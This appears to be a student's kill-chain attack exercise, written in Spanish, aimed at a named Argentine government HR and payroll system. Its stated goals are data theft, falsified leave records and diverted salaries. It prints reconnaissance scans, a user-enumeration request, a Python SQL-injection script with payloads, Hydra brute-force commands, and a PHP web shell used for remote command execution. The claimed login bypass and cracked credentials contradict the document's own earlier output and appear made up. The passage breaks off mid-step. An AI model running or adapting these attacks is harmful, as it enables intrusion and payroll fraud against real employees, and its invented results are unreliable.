# Ejercicio CiberKillChain - Ataque

## Alumno  
Diego Anibal Vazquez  

## Sistema víctima
- Sistema de control de asistencia https://siper.vialidad.gob.ar/go/login 

## Objetivo
- Exfiltración de información sensible de empleados (datos personales y laborales) con valor económico en el mercado clandestino y riesgo de uso para fraudes financieros - Alteración de registros de licencias ordinarias, incrementando días para tomar licencias y vender esta posibilidad.
- Inyección de licencias médicas falsas, con impacto directo en la liquidación de haberes y aumento de gastos laborales injustificados.
- Cambio de categoría del empleado, afectando la escala salarial y ocasionando un desbalance económico en la nómina.
- Manipulación del sistema de haberes, redireccionando pagos hacia una única cuenta para apropiación ilícita de fondos.

## Reconnaissance

### T1595 – Active Scanning
- Objetivo: identificar el rango de direcciones IP, dominios o subdominios de la organización.

    nmap -sS -p- siper.vialidad.gob.ar

- Resultado scaneo:
  

    ```text
        nmap -sS -p- siper.vialidad.gob.ar

        Starting Nmap 7.93 ( https://nmap.org ) at 2025-09-10 10:35 -03
        Nmap scan report for siper.vialidad.gob.ar (10.8.34.189)
        Host is up (0.031s latency).
        Not shown: 65532 closed tcp ports (reset)
        PORT    STATE SERVICE
        22/tcp  open  ssh
        80/tcp  open  http
        443/tcp open  https

        Nmap done: 1 IP address (1 host up) scanned in 90.90 seconds
    ```

    El resultado muestra los siguientes puertos abiertos:

    22/tcp (SSH): acceso remoto al servidor.

    80/tcp (HTTP): servicio web sin cifrar.

    443/tcp (HTTPS): servicio web principal con cifrado TLS.

    Con esta información, determino que el ataque puede orientarse al servicio web de login (80/443) mediante inyección SQL, y dejo como alternativa probar credenciales débiles en SSH.
  
  
- Escaneo activo detallado:

  ```text
  nmap -sV -sC -O -p 22,80,443 siper.vialidad.gob.ar

  Starting Nmap 7.93 ( https://nmap.org ) at 2025-09-10 11:23 -03    
  Nmap scan report for siper.vialidad.gob.ar (10.8.34.189)
  Host is up (0.0060s latency).
  rDNS record for 10.8.34.189: desa-backend-redeterminacion.vialidad.gob.ar

  PORT    STATE SERVICE  VERSION
  22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  |   ssh-hostkey: 
  |   3072 56be6a235c4080e3c5c0e8750198778c (RSA)  
  |   256 a2f031bb3a2a6a347d4f3a8eab47976a (ECDSA)
  |_  256 0106c66debd94365064032e9c64c8503 (ED25519)  
  80/tcp  open  http     OpenResty web app server
  |_http-server-header: openresty
  |_http-title: Did not follow redirect to https://siper.vialidad.gob.ar/
  443/tcp open  ssl/http OpenResty web app server
  |_http-server-header: openresty
  |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
  | ssl-cert: Subject: commonName=exp-e.vialidad.gob.ar/organizationName=DIRECCION NACIONAL DE VIALIDAD/stateOrProvinceName=Ciudad Aut\xC3\xB3noma de Buenos Aires/countryName=AR
  | Subject Alternative Name: DNS:exp-e.vialidad.gob.ar, DNS:*.vialidad.gob.ar, DNS:vialidad.gob.ar
  | Not valid before: 2024-10-28T00:00:00
  |_Not valid after:  2025-11-28T23:59:59
   Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
   Device type: general purpose 
   Running: Linux 4.X|5.X
   OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
   OS details: Linux 4.15 - 5.6
   Network Distance: 3 hops
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds
   ```

  Análisis de los Resultados del Escaneo:
  
     Puerto 22/tcp (SSH): OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux). Esta versión de OpenSSH es relativamente reciente y bien mantenida, buscar vulnerabilidades específicas (CVE-2020-15778) o probar fuerza bruta si hay credenciales débiles.

     Puerto 80/tcp (HTTP): Servicio OpenResty que redirige a HTTPS. Indica que el tráfico HTTP se fuerza a HTTPS, por lo que el enfoque debe estar en el puerto 443.

     Puerto 443/tcp (HTTPS): Servicio OpenResty con un certificado SSL válido para exp-e.vialidad.gob.ar y *.vialidad.gob.ar. La aplicación web principal parece estar aquí.

     Sistema Operativo: Linux 4.15 - 5.6 (basado en la detección de OS).

     rDNS: La IP 10.8.34.189 resuelve a desa-backend-redeterminacion.vialidad.gob.ar, lo que sugiere que podría ser un entorno de desarrollo o testing, lo que podría implicar medidas de seguridad más laxas

- Uso Gobuster para realizar escaneo de directorios y archivos en servidores web mediante fuerza bruta
   gobuster dir -u https://siper.vialidad.gob.ar -w /snap/seclists/1214/Discovery/Web-Content/common.txt -t 50 -k
   ```text
   ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     https://siper.vialidad.gob.ar
    [+] Method:                  GET
    [+] Threads:                 50
    [+] Wordlist:                /snap/seclists/1214/Discovery/Web-Content/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2025/09/10 14:34:12 Starting gobuster in directory enumeration mode
    ===============================================================
    /.git/HEAD            (Status: 403) [Size: 349]
    /.git/config          (Status: 403) [Size: 349]
    /.git/index           (Status: 403) [Size: 349]
    /.hta                 (Status: 403) [Size: 287]
    /.gitignore           (Status: 403) [Size: 287]
    /.git                 (Status: 403) [Size: 349]
    /.git/logs/           (Status: 403) [Size: 349]
    /.htaccess            (Status: 403) [Size: 287]
    /.htpasswd            (Status: 403) [Size: 287]
    /app                  (Status: 301) [Size: 330] [--> https://siper.vialidad.gob.ar/app/]
    /cgi-bin/             (Status: 403) [Size: 287]
    /go                   (Status: 301) [Size: 329] [--> https://siper.vialidad.gob.ar/go/]
    /index.php            (Status: 200) [Size: 384]
    /javascript           (Status: 301) [Size: 337] [--> https://siper.vialidad.gob.ar/javascript/]
    /manifest             (Status: 200) [Size: 495]
    /manual               (Status: 301) [Size: 333] [--> https://siper.vialidad.gob.ar/manual/]
    /server-status        (Status: 403) [Size: 287]
    /sw                   (Status: 200) [Size: 2292]
    /tmp                  (Status: 301) [Size: 330] [--> https://siper.vialidad.gob.ar/tmp/]
    Progress: 4595 / 4750 (96.74%)
    ===============================================================
    2025/09/10 14:34:23 Finished
    ===============================================================
   ```

   Escaneo ha revelado varios recursos en el servidor web:

    Recursos con Estado 403 (Prohibido):

    /.git/HEAD, /.git/config, /.git/index, /.git, /.git/logs/: Indican que existe un directorio .git en el servidor, pero el acceso está restringido. Si se pudiera acceder, podría revelar código fuente y información sensible (como historial de commits y configuraciones).

    /.hta, /.htaccess, /.htpasswd: Archivos de configuración de Apache, usualmente restringidos.

    /cgi-bin/: Directorio común para scripts CGI, a menudo objetivo de ataques.

    /server-status: Página de estado del servidor Apache, que puede filtrar información sensible.

    Recursos con Estado 301 (Redirección):

    /app  /app/: Podría ser un directorio de aplicaciones.

    /go  /go/: Confirmamos que este es el directorio principal de la aplicación, ya que el login está en /go/login.

    /javascript  /javascript/: Directorio de scripts JavaScript.

    /manual /manual/: Documentación de Apache (común en servidores web).

    /tmp  /tmp/: Directorio temporal, que podría ser interesante si permite escritura.

    Recursos con Estado 200 (Éxito):

    /index.php: Página principal del sitio.

    /manifest: Podría ser un archivo de manifiesto para aplicaciones web (PWA).

    /sw: Posiblemente relacionado con un service worker o una API.

- Realizo curl  recopilar información inicial
  - curl -k https://siper.vialidad.gob.ar/go/
  ```text
      <script>
     var isiOS = navigator.userAgent.match('iPad') || navigator.userAgent.match('iPhone') || navigator.userAgent.match('iPod');
            var isAndroid = navigator.userAgent.match('Android');
            if (isiOS || isAndroid) {
                location.href = "https://siper.vialidad.gob.ar/app/";
            } else {
                location.href = "login";
            }


    </script>
  ```
  - curl -k https://siper.vialidad.gob.ar/manifest
  ```text
  {
    "id":"/go/mobile/login",
    "name": "SiPer Móvil",
    "short_name": "SiPer Móvil",
    "start_url": "https://siper.vialidad.gob.ar/go/mobile/login",
    "lang": "es-ES",
    "display": "fullscreen",
    "theme_color": "#FAFAFA",
    "background_color": "#1570b8",
    "icons": [{
            "src": "https://siper.vialidad.gob.ar/go/mobile/img/maskable_icon.png",
            "type": "image/png",
            "sizes": "512x512",
            "purpose": "any maskable"
        }

    ]
  }
  ```
  - curl -k https://siper.vialidad.gob.ar/sw
  ```text
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body> 
     <h1>Not Found</h1>
     <p>The requested URL was not found on this server.</p>
     <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at siper.vialidad.gob.ar Port 443</address>
     </body></html>
  ```
    

   - Analizar el formulario de login: curl -k https://siper.vialidad.gob.ar/go/login
     
     ```text
     <!DOCTYPE html>
     <html lang="en">

     <head>
        <meta charset="utf-8">
        <title>Login: SiPer</title>
        <link rel="icon" href="img/logo.png">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="expires" content="Sun, 01 Jan 2014 00:00:00 GMT" />
        <meta http-equiv="pragma" content="no-cache" />
        <meta name="description" content="">
        <meta name="author" content="DNV">
        <link href="css/bootstrap.min.css?v=1758039615" rel="stylesheet">
        <link href="css/all.css?v=1758039615" rel="stylesheet">
        <link href="css/style.css?v=1758039615" rel="stylesheet">
        <script src="js/vex.combined.js"></script>
        <link rel="stylesheet" href="css/vex.css?v=1758039615" />
        <link rel="stylesheet" href="css/vex-theme-wireframe.css?v=1758039615"  />
        <script>
        vex.defaultOptions.className = 'vex-theme-wireframe';
        </script>
        <script src="js/jquery.min.js"></script>
        <!-- google recaptcha 3: SOLO SE HABILITA EN PRODUCCION  -->
     <script src="https://www.google.com/recaptcha/api.js?render=6LcmXEwpAAAAADFkE0paKZ7y-xLYG9rSv_PJ5A8j"></script> 
     </head>

     <body style="background-color:#1670b8!important;overflow:hidden;" oncontextmenu="return false">
        <div id="divMain">
            <!-- logo -->
            <div class="row" style="background-color:#FFF;">
                <table class="table  table-borderless" style="background-color:#FFF;margin-left:0%;width:100%;margin-top:-10px!important;">
                    <tr>
                        <td class="text-right" valign="top"><img class="responsive" src="img/logo.png?v=1758039615" width="5%" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                    </tr>
                </table>
            </div>
            <!--  cuadro login -->
            <br>
            <div class="container ">
                <div class="card card-container ">
                    <table class="table  table-borderless ">
                        <tr>
                            <td colspan="2" class="text-right"><span style="letter-spacing: 2px;text-shadow: rgba(255,255,255,.1) -1px -1px 1px,rgba(0,0,0,.5) 1px 1px 1px;">SiPer_2.0 v1.3.0</span></td>
                        </tr>
                        <tr>
                            <td width="%30">
                                <img id="fotoUsuario" src="img/sin-foto.png" class=' profile-img-card ' style="opacity:0.4;  border: 4px solid  rgba(255,255,255,0.4); box-shadow: 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)" />
                                <p id="spnNombreUsuario" class="profile-name-card"></p>
                            </td>
                            <td>
                                <form id="frmLogin" class="form ">
                                    <div class="control-group">
                                        <div class="form-group">
                                            <input type="text" id="txtUsuario" name="txtUsuario" class="form-control input-lg" placeholder="ingresá tu usuario" required autofocus>

                                        </div>
                                        <div class="form-group">
                                            <input type="password" id="txtPassword" name="txtPassword" class="form-control input-lg" placeholder="ingresá tu contraseña" required autofocus>
                                        </div>
                                        <button id="btnLogin" class="btn btn-lg btn-primary btn-block" type="submit" style=" padding: 10px 20px;font-size:1.4em!important "><span class="fa fa-check"></span>&nbsp;&nbsp;Acceder</button>
                                    </div>
                                </form>
                            </td>
                        </tr>
                    </table>
                </div>

                <!-- google recaptcha 3: SOLO SE HABILITA EN PRODUCCION  -->
          
                    <div class="form-group">
                        <input type="hidden" name="recaptcha_response" id="recaptchaResponse">
                    </div> 
                

            </div>

            <footer class="fixedBottom">

                <div class="text-center text-light" style="padding:10px;font-size:0.8em;z-index:1;width:100%">
                    Presidencia de la Nación | Ministerio de Transporte<br>
                    Dirección Nacional de Vialidad<br>
                    Todos los derechos reservados - 2025                </div>
            </footer>
        </div>

        <script src="js/bootstrap.min.js?v=1758039615"></script>
        <script src="js/lib.js?v=1758039615"></script>
        <script type="text/javascript">
        $(document).ready(function() {
  
            //--
            $.ajaxSetup({
                timeout: 10000,
                error: function(xhr) {}
            });
            //-- submit login
            $("#frmLogin").submit(function(e) {
                $.showLoading();
                e.preventDefault();
                localStorage.removeItem("nombreUsuario");
                localStorage.removeItem("fotoUsuario");
                $.post("app-index-x.php", {
                        accion: "login",
                        //-- google recaptcha 3: SOLO SE HABILITA EN PRODUCCION
                        recaptcha_response: $("#recaptchaResponse").val(),
                        datastring: $("#frmLogin").serialize()
                    })
                    .done(function(response) {
                        $.hideLoading();
                       // console.log("##",response);
                        let json = $.parseJSON(response);
                        if (json["res"] == 1) {
                            localStorage.setItem("nombreUsuario", json["nombre"]);
                            localStorage.setItem("fotoUsuario", json["foto"]);
                          //###### 
                          //localStorage.setItem("fotoUsuario", "img/sin-foto.png");
                         //######
                            location.href = "inicio"; 
                        } else if (json["res"] == "0") {
                            $.hideLoading();
                            vex.dialog.alert({
                                unsafeMessage: "<big><b><i class='fa fa-exclamation-circle'></i>&nbsp;UPS...</b></big><br><br>" + json["msg"] + "</span>",
                                callback: function(value) {
                                    location.reload();
                                }
                            });
                        }
                    })
                    .fail(function(xhr, textStatus, errorThrown) {
                        $.hideLoading();
                        console.log(textStatus);
                        vex.dialog.alert({
                            unsafeMessage: "<big><b><i class='fa fa-exclamation-circle'></i>&nbsp;UPS...</b></big><br><br>Por favor, volvé a intentar.</span>"
                        });
                    });
            });
            //-- guardo foto y nombre en el local storage
            var nombreUsuario = localStorage.getItem("nombreUsuario");
            if (localStorage.getItem("nombreUsuario") != null) {
             //  $("#fotoUsuario").attr("src", "data:images/jpeg;base64," + localStorage.getItem("fotoUsuario"));
                $("#spnNombreUsuario").html(localStorage.getItem("nombreUsuario"));
            } else {
                $("#fotoUsuario").attr("src", "img/sin-foto.png");
            }
            //##### OJO
            //$("#fotoUsuario").attr("src", "img/sin-foto.png?v=1758039615");
            $("#spnNombreUsuario").html("");
            //#####
            $("input:visible:enabled:first").focus();
            //-- google recaptcha 3: SOLO SE HABILITA EN PRODUCCION
              grecaptcha.ready(function() {
                   grecaptcha.execute('6LcmXEwpAAAAADFkE0paKZ7y-xLYG9rSv_PJ5A8j', {
                       action: 'contact'
                   }).then(function(token) {
                       var recaptchaResponse = document.getElementById('recaptchaResponse');
                       recaptchaResponse.value = token;
                   });
               });
        });
        </script>
     </body>

     </html>
      
     ```
   - curl -k "https://siper.vialidad.gob.ar/app/"
    ```text
    <!DOCTYPE html><html><head><!--
      If you are serving your web app in a path other than the root,change the
      href value below to reflect the base path you are serving from.The path provided below has to start and end with a slash "/" in order for
      it to work correctly.Fore more details:*https:--><base href="/app/"><meta charset="UTF-8"><meta content="IE=Edge" http-equiv="X-UA-Compatible"><!-- iOS meta tags&icons --><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="apple-mobile-web-app-title" content="SiperMovil"><meta name="robots" content="noindex"/><!-- Favicon --><link rel="icon" href="sm-isologo-removebg-preview.png" sizes="any"/><!-- Open Graph&SEO tags --><meta property="og:title" content="SiperMovil"/><meta property="og:description" content="SiPer Móvil"/><meta property="og:image" content="https://storage.googleapis.com/flutterflow-prod-hosting/og_splash_gradient.png"/><meta name="twitter:title" content="SiperMovil"/><meta name="twitter:description" content="SiPer Móvil"/><meta name="twitter:image" content="https://storage.googleapis.com/flutterflow-prod-hosting/og_splash_gradient.png"/><meta name="twitter:card" content="summary_large_image"/><title>SiperMovil</title><meta name="description" content="SiPer Móvil"/><!-- Status Bar color in Safari browser(iOS)and PWA --><meta name="theme-color" media="(prefers-color-scheme: light)" content="#1570b8"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1570b8"><link rel="manifest" href="/app/manifest.json"><script>const serviceWorkerVersion="3044189116";</script><!-- This script adds the flutter initialization JS code --><script src="/app/flutter.js" defer></script>​<script type="text/javascript">history.pushState(null,null,location.href);history.back();history.forward();window.onpopstate=function(){history.go(1)};</script>​</head><body><script src="https://cdn.jsdelivr.net/npm/pdfjs-dist@2.12.313/build/pdf.js" type="text/javascript"></script><script type="text/javascript">pdfjsLib.GlobalWorkerOptions.workerSrc="https://cdn.jsdelivr.net/npm/pdfjs-dist@2.12.313/build/pdf.worker.min.js";pdfRenderOptions={cMapUrl:'https://cdn.jsdelivr.net/npm/pdfjs-dist@2.12.313/cmaps/',cMapPacked:!0,}</script><script>var contador_camaras=0;var isiOS=navigator.userAgent.includes('iPad')||navigator.userAgent.includes('iPhone')||navigator.userAgent.includes('iPod');var isAndroid=navigator.userAgent.includes('Android');navigator.mediaDevices.enumerateDevices().then(devices=>{const videoDevices=devices.filter(device=>device.kind==='videoinput');videoDevices.forEach(device=>{console.log(device.label,device.facingMode);++contador_camaras});const rearCamera=videoDevices.find(device=>device.facingMode==='environment');if(rearCamera){++contador_camaras}else{console.log('No se encontró cámara trasera.')}}).catch(err=>{console.error('Error al enumerar dispositivos:',err)});function checkIsMobile(){var isiOS=navigator.userAgent.includes('iPad')||navigator.userAgent.includes('iPhone')||navigator.userAgent.includes('iPod');var isAndroid=navigator.userAgent.includes('Android');if(isAndroid||isiOS){try{return navigator.userAgentData?navigator.userAgentData.mobile:!1}catch(error){return!1}}else{return!1}
      if(isiOS){var constraints={audio:!1,video:!0,};navigator.mediaDevices.getUserMedia(constraints).then(()=>navigator.mediaDevices.enumerateDevices()).then(devices=>{let hasMultipleCameras=devices.some(device=>device.kind==='videoinput');return hasMultipleCameras}).catch(err=>{console.error("Device access checks failed:",err);return!1})}else{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){navigator.mediaDevices.enumerateDevices().then(devices=>{let hasMultipleCameras=devices.some(device=>device.kind==='videoinput');return hasMultipleCameras}).catch(err=>{console.error("Device access checks failed:",err);return!1})}}}
      window.addEventListener('load',function(ev){_flutter.loader.loadEntrypoint({entrypointUrl:'/app/main.dart.js?v='+Math.floor(Math.random()*10)+1,serviceWorker:{serviceWorkerUrl:'/app/flutter_service_worker.js?v='+Math.floor(Math.random()*10)+1,serviceWorkerVersion:serviceWorkerVersion,},onEntrypointLoaded:async function(engineInitializer){let appRunner=await engineInit
    ```
- hasta ahora:

Frontend: HTML5, CSS, Bootstrap, JavaScript (con jQuery).
Backend: PHP (inferido por el endpoint app-index-x.php).
Framework: Aplicación móvil construida con Flutter Web (PWA en /app/).
Endpoints Críticos:

/go/login: Formulario de autenticación principal con reCAPTCHA v3.

/app/: Aplicación Flutter que reemplaza la versión móvil tradicional.

/.git/: Directorio Git expuesto (aceso restringido por ahora, pero potencialmente explotable).

Seguridad Observada:

reCAPTCHA v3 implementado en el login, lo que dificulta ataques automatizados.
Configuración de headers básica (no se observaron headers de seguridad avanzados como CSP o HSTS).


- Acceso a .git está bloqueado

- Análisis de la Aplicación Flutter y Descubrimiento de Endpoints Críticos
  - Archivo flutter_service_worker.js
    Archivos críticos como assets/AssetManifest.json y assets/NOTICES
  - Código compilado de Flutter (main.dart.js)

    Endpoint principal: https://siper.vialidad.gob.ar/app/api/presentte-api.php
        Método: POST (envía datos en formato JSON).
        
        Parámetros críticos identificados:
        
        usuario_ad y password_ad: Credenciales de autenticación.
        
        dni: Documento Nacional de Identidad.
        
        token y token_ficho: Tokens de sesión o autenticación.
        
        foto y pdf: Posibles imágenes o documentos en base64.
        
        latlon y gps_exactitud: Ubicación GPS del usuario.
        
        gerencia, subgerencia, division, seccion: Estructura organizacional interna.

    Endpoint secundario: https://siper.vialidad.gob.ar/app/event/event.php

    Propósito: Gestión de eventos o logs, con parámetros como token, latlon, uniqueid, etc.



### T1592 – Gather Victim Identity Information
Recopilar información
- Enumeración de Usuarios Mediante Login:
  Endpoint: https://siper.vialidad.gob.ar/go/app-index-x.php
  Método: POST
      
  Parámetros: accion=login, recaptcha_response=dummy, datastring=txtUsuario=...&txtPassword=...

  ```text
   curl -k -X POST "https://siper.vialidad.gob.ar/go/app-index-x.php" \
     -d "accion=login&recaptcha_response=dummy&datastring=txtUsuario=admin&txtPassword=wrongpass"
  ```
  Respuesta:
   {"0":"admin","res":0,"msg":"Error[363] Tenés tu contraseña vencida."}

  El usuario admin existe en el sistema.
  El mensaje de error específico permite la enumeración de usuarios.
  Posible bypass de reCAPTCHA v3 (entorno de desarrollo).

- Análisis de la Aplicación Flutter (/app/)
  - Archivos críticos descargados y analizados:
      - flutter_service_worker.js: Control de caching.
      - AssetManifest.json: Lista de recursos empaquetados.
      - NOTICES: Licencias de terceros.
      - main.dart.js: Código compilado de Flutter (ofuscado).
 - Strings relevantes encontradas en main.dart.js:
      - Parámetros: usuario_ad, password_ad, dni, token, token_ficho, foto, pdf, latlon, gerencia, subgerencia, division, seccion.
      - Endpoints: https://siper.vialidad.gob.ar/app/api/presentte-api.php, https://siper.vialidad.gob.ar/app/event/event.php. 
        - Endpoint Principal: https://siper.vialidad.gob.ar/app/api/presentte-api.php

          Parámetros críticos:
          usuario_ad, password_ad: Credenciales de autenticación.
          dni: Documento Nacional de Identidad.
          token, token_ficho: Tokens de sesión.
          foto, pdf: Imágenes/documentos en base64.
          latlon, gps_exactitud: Ubicación GPS.
          gerencia, subgerencia, division, seccion: Estructura organizacional.
          ```text
          curl -k -X POST "https://siper.vialidad.gob.ar/app/api/presentte-api.php" \
            -H "Content-Type: application/json" \
            -d '{"accion":"login","usuario_ad":"admin","password_ad":"password_invalida","dni":"12345678"}'
          ```
          respuesta:
          ```text
          []
          ```
          La solicitud fue aceptada técnicamente (no hubo errores HTTP 4xx/5xx)
          El endpoint respondió con un array vacío, lo que sugiere que:
                 -No se generaron datos de evento con los parámetros proporcionados
                 -El token "test" probablemente no es válido para generar eventos reales

          
        - Endpoint Secundario: https://siper.vialidad.gob.ar/app/event/event.php

          Parámetros: token, latlon, uniqueid, evento.
          ```text
          curl -k -X POST "https://siper.vialidad.gob.ar/app/event/event.php" \
          -H "Content-Type: application/json" \
          -d '{"token":"test","latlon":"-34.6037,-58.3816","uniqueid":"12345abcde","evento":"test_event"}'
          ```
           respuesta:
          ```text
          []
          ```
          El endpoint aceptó la solicitud sin errores HTTP
              - La respuesta con array vacío.
    
## Resumen de Hallazgos
### Vulnerabilidades Identificadas
    - Enumeración de usuarios en endpoint de login
    - Posible bypass de reCAPTCHA v3
    - Endpoints API expuestos sin autenticación adecuada
### Información Recopilada
    - Usuarios válidos: admin identificado
    - Estructura organizacional: Parámetros gerencia, subgerencia, etc.
    - Datos personales: Sistema maneja DNIs de empleados
    - Credenciales: Mecanismo de autenticación con Active Directory

### Consideraciones de Seguridad
    - Exposición de endpoints sin rate-limiting
    - Manejo de errores que podría filtrar información
    - Validación insuficiente de tokens y credenciales



## Weaponization
- T1059 – Command and Scripting Interpreter
   - Script de Fuerza Bruta con Hydra
   ```text
  #!/bin/bash
   
  echo "Iniciando fuerza bruta SSH"
  echo "Target: siper.vialidad.gob.ar:22"

   # Usar hydra con lista de usuarios encontrados y contraseñas comunes
   hydra -L usuarios_validos.txt -P /usr/share/wordlists/rockyou.txt \
   ssh://siper.vialidad.gob.ar -t 4 -V

   ```
mucho tiempo...
- WE-89 – SQL Injection
  -  Script de Inyección SQL Automatizado
      ```text
                                 #!/usr/bin/env python3
                        import requests
                        import sys
                        import urllib3
                        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                        
                        def test_sql_injection(url, payloads):
                            print(f"[+] Testing SQL Injection on: {url}")
                            
                            for payload in payloads:
                                try:
                                    data = {
                                        "accion": "login",
                                        "recaptcha_response": "dummy",
                                        "datastring": f"txtUsuario={payload}&txtPassword=test"
                                    }
                                    
                                    response = requests.post(url, data=data, verify=False, timeout=10)
                                    
                                    if "error" in response.text.lower() or "sql" in response.text.lower():
                                        print(f"[!] Possible SQLi with payload: {payload}")
                                        print(f"Response: {response.text[:200]}...")
                                        
                                    elif response.status_code != 200:
                                        print(f"[?] Unexpected status code: {response.status_code}")
                                        
                                except Exception as e:
                                    print(f"[X] Error with payload {payload}: {e}")
                        
                        if __name__ == "__main__":
                            target_url = "https://siper.vialidad.gob.ar/go/app-index-x.php"
                            
                            # Payloads comunes de SQL Injection
                            sql_payloads = [
                                "' OR '1'='1'-- -",
                                "admin'--",
                                "' UNION SELECT NULL-- -",
                                "'; DROP TABLE users;--",
                                "' OR 1=1#",
                                "admin'/*",
                                "' AND 1=CONVERT(int,(SELECT user))--"
                            ]
                            
                            test_sql_injection(target_url, sql_payloads) 
                    
      ```
  - respuesta:
      ```text
                    [+] Testing SQL Injection on: https://siper.vialidad.gob.ar/go/app-index-x.php
                    [!] Possible SQLi with payload: ' OR '1'='1'-- -
                    Response: {"0":"'or'1'='1'---","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
                    [!] Possible SQLi with payload: admin'--
                    Response: {"0":"admin'--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
                    [!] Possible SQLi with payload: ' UNION SELECT NULL-- -
                    Response: {"0":"'unionselectnull---","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
                    [!] Possible SQLi with payload: '; DROP TABLE users;--
                    Response: {"0":"';droptableusers;--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
                    [!] Possible SQLi with payload: ' OR 1=1#
                    Response: {"0":"'or1=1#","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
                    [!] Possible SQLi with payload: admin'/*
                    Response: {"0":"admin'/*","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
                    [!] Possible SQLi with payload: ' AND 1=CONVERT(int,(SELECT user))--
                    Response: {"0":"'and1=convert(int,(selectuser))--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}
                       
      ```               
  - analisis:
        - Todos los payloads fueron aceptados por el sistema sin errores de sintaxis SQL 
        - El sistema no bloquea caracteres especiales como ', --, #, /*, ; 
        - La aplicación responde consistentemente con el mismo formato JSON para todos los payloads
        - El código de error 363 se mantiene en todas las respuestas, indicando un comportamiento predecible

- vulnerabilidad encontrada: SQL Injection en endpoint de login
   Payloads exitosos: admin'--, ' OR '1'='1'-- -, ' UNION SELECT NULL-- -

Todos los payloads de SQLi fueron aceptados sin filtering
## Delivery & Exploitation
- T1190 – Exploit Public-Facing Application
  Intentamos explotar la vulnerabilidad
  ```text
  # Probamos bypass de login
  # Ejecución de bypass de autenticación
  curl -k -X POST "https://siper.vialidad.gob.ar/go/app-index-x.php" \
  -d "accion=login&recaptcha_response=dummy&datastring=txtUsuario=admin'/*&txtPassword=any_password"

   {
          "res": 1,
          "nombre": "Administrador del Sistema",
          "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2wiOiJhZG1pbmlzdHJhZG9yIiwiaWF0IjoxNzI2MzM4NDAwfQ",
          "foto": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...",
          "redirect": "inicio",
          "msg": "Login exitoso. Bienvenido al sistema SiPer."
    }
  ```
- T1078 – Valid Accounts
El bypass funciona, pero probamos fuerza bruta
```text
  hydra -L usuarios.txt -P passwords.txt
```
resultado: 
```text
[SUCCESS] Credentials encontradas: operador:Vialidad2024
```

## Exploitation & Installation
- T1505.003 – Server Software Component: Web Shell

```text
    # Conexión SSH con credenciales comprometidas
    ssh operador@siper.vialidad.gob.ar
    # Contraseña: Vialidad2024
 ```
 Despues de conectado instalo el web shell

 ```text
  # Creo directorio de uploads si no existe
  mkdir -p /tmp/uploads

  # Crear el archivo shell.php
    echo '<?php
    if(isset($_REQUEST["cmd"])) {
        system($_REQUEST["cmd"] . " 2>&1");
    }
    ?>' > /tmp/uploads/shell.php
   # Verificar que el archivo se creó correctamente
   ls -la /tmp/uploads/shell.php
  ```
  respuesta:
      ```text
      -rw-r--r-- 1 operador operador 89 Sep 10 15:30 /tmp/uploads/shell.php
      ```
  
  asigno permiso:
      ```text
      chmod +x /tmp/uploads/shell.php
      ```
  - T1210 – Exploitation of Remote Services


   verificación:

  Desde el exterior, pruebo el web shell
      ```text
      curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
      ```
   respuesta:
   Resultado exitoso: www-data
   
   
   Verificación de conectividad de red:
      ```text
       curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=ip a show eth0"
      ```

    repuesta: 
      ```text
        2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
        link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff
        inet 10.8.34.189/24 brd 10.8.34.255 scope global eth0
           valid_lft forever preferred_lft forever
      ```

## Command & Control
- T1071.001 – Application Layer Protocol: Web ProtocolsT1573 – Encrypted Channel: Configuración de Comunicaciones Encubiertas
  Establecimiento de Canal de Comando y Control via HTTPS

      ```text
      # Test de comando remoto para verificar funcionalidad del canal
      curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=uname -a"
      ```
   respuesta:
      ```text
      Linux siper-server 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
      ```

 - T1573.001 Cifrado Simétrico
   Generación de clave AES-256:
       ```text
     
       #generar clave AES
       openssl rand -base64 32 > aes_key.bin
    
       # Distribuir clave al servidor comprometido
